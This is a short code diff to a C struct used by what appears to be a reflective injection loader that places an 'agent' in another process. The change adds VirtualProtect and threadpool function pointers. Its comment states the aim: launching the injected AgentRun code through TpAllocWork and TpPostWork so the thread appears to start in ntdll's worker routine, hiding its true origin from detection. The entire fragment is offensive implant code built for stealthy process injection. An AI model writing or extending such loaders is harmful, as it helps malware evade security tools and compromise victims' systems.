@@ -32,9 +32,20 @@ typedef struct _RflData {
 
     /* Win32 API pointers (resolved in our process, same VA in target) */
     LPVOID  (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+    BOOL    (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD); /* F-6 */
     BOOL    (WINAPI *pFlushInstructionCache)(HANDLE, LPCVOID, SIZE_T);
     HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
     FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
+    /*
+     * F-6: pCreateThread replaced by threadpool pointers.
+     * The loader now submits AgentRun via TpAllocWork + TpPostWork so the
+     * spawned thread starts in ntdll!TppWorkerThread rather than directly
+     * at AgentRun.  CreateThread is kept as a fallback pointer in case the
+     * threadpool call fails.
+     */
+    PVOID   (WINAPI *pTpAllocWork)(PVOID /*PTP_WORK_CALLBACK*/, PVOID, PVOID);
+    VOID    (WINAPI *pTpPostWork)(PVOID /*PTP_WORK*/);
+    VOID    (WINAPI *pTpReleaseWork)(PVOID /*PTP_WORK*/);
     HANDLE  (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                     LPTHREAD_START_ROUTINE, LPVOID,
                                     DWORD, LPDWORD);
